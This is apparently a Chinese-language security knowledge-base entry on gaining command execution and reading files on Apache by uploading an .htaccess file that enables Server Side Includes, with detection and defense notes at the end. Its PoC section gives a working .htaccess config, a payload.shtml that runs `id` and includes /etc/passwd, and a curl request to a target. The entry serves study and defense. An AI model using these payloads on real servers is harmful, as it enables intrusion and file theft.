---
id: web-php-rce-htaccess-ssi-includes-exec
title: .htaccess 开启 SSI 后上传页面执行任意命令与读取文件
type: scenario
domain: web
path: web/php/rce
technique: htaccess-ssi-exec
tags:
- apache
- htaccess
- ssi
- rce
- file-read
- server-side-include
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:19:06+08:00'
  notes: '已对照原文核对：Options +Includes、AddType text/html .shtml、AddOutputFilter INCLUDES .shtml、<!--#exec cmd> 与 <!--#include file>、XBitHack on 均一致；IncludesNOEXEC 只禁 #exec 的边界正确，原文未给受影响版本区间，未设置'
url: /docs/web/php/rce/web-php-rce-htaccess-ssi-includes-exec/
draft: false
kb_aliases:
- Server Side Include
- Options +Includes
- AddOutputFilter INCLUDES
- XBitHack
- '#exec cmd'
- SSI 命令执行
---

## 一句话结论

Apache 的 mod_include 支持在页面中解析 `<!--#exec cmd="..." -->`；只要通过 `.htaccess` 打开 `Options +Includes` 并给上传文件挂上 INCLUDES 过滤器，上传一个包含 SSI 指令的页面，访问时就会由 Apache 以自身权限执行系统命令或读取任意文件。

## 原理

- SSI（Server Side Include）是 Apache `mod_include` 提供的服务端指令集。被标记为 server-parsed 的文件在返回前会被解析，`<!--#exec cmd="id" -->` 会启动 shell 执行命令并把 stdout 插入响应，`<!--#include file="/etc/passwd" -->` 会把文件内容插入响应。
- 文件是否被解析由 handler/filter 决定：`AddOutputFilter INCLUDES .shtml` 给 `.shtml` 挂上 include 过滤器；`AddType text/html .shtml` 确保 MIME 正确；`Options +Includes` 打开 SSI 能力。
- `XBitHack on` 是另一种开关：任何带执行位的文件都会被当作 SSI 解析，不依赖扩展名。上传后若能让文件带上 `+x`（上传实现、解压、其他写文件原语），即可触发。
- `#exec` 执行的是 Apache 子进程（通常是 `/bin/sh -c`），因此不受 PHP `disable_functions` 限制；`#include` 读取文件也只受 Apache 进程文件权限限制。
- 如果目录配置为 `Options IncludesNOEXEC`，则 `#include` 仍可用但 `#exec` 被禁用；这是该手法最常见的失败原因。

## 触发条件

- Apache 已加载 `mod_include`（默认常加载）。
- `AllowOverride` 允许 `Options` 与 `FileInfo`/`All`，`.htaccess` 可生效。
- 攻击者可上传一个将被 SSI 解析的文件（`.shtml`，或 `XBitHack` 下任意可执行位文件）。
- 目录未设置 `IncludesNOEXEC`；`Options +Includes` 未被父配置禁止。

## 利用步骤

1. 上传 `.htaccess`，开启 `Includes` 并把目标后缀挂上 INCLUDES 过滤器（或打开 `XBitHack`）。
2. 上传包含 SSI 指令的页面文件。
3. 访问该页面；`#exec` 命令输出或 `#include` 文件内容出现在响应中。
4. 若 `#exec` 被 `IncludesNOEXEC` 禁用，改用 `#include` 读源码/配置/密钥，或结合其他 RCE 链。

## PoC

`.htaccess`：

```apache
Options +Includes
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

`payload.shtml`：

```html
<!--#exec cmd="id" -->
<!--#include file="/etc/passwd" -->
```

访问：

```bash
curl -s 'http://target/upload/payload.shtml'
```

`XBitHack` 变体：

```apache
Options +Includes
XBitHack on
```

上传任意文件后赋予执行位（如 `chmod +x payload.html`），Apache 会按 SSI 解析。

## 变体与关联

- 指令变体：`#exec cgi="/cgi-bin/..."` 执行 CGI；`#include virtual="..."` 包含虚拟路径；`#fsize`/`#flastmod` 做文件元信息探测。
- 开关变体：`AddOutputFilter INCLUDES .html` 让普通 HTML 也被解析；`XBitHack full` 让带执行位的文件按 SSI 处理。
- 关联：[[web-php-rce-htaccess-cgi-addhandler-bypass-disable-functions]]（同为 Apache 子进程执行，绕过 PHP 限制）；[[web-php-rce-htaccess-setenv-ld-preload]]（环境变量劫持另一条 Apache 侧执行路径）；[[web-generic-file-upload-htaccess-handler-override]]（配置覆盖的基本形态）。
- 边界：`IncludesNOEXEC` 只禁 `#exec`；未加载 mod_include、`AllowOverride None`、上传目录无法解析 SSI 时不成立。

## 检测与防御

- 检测：`.htaccess` 出现 `Options +Includes`、`AddOutputFilter INCLUDES`、`XBitHack`；上传目录出现 `.shtml` 或带 SSI 指令的页面；响应中出现命令输出或被包含的敏感文件内容。
- 防御：`AllowOverride None`；不加载 `mod_include` 或使用 `Options IncludesNOEXEC`；上传目录禁止 SSI 解析与脚本执行；上传内容检测 `<!--#exec`、`<!--#include`；以最小权限运行 Apache。
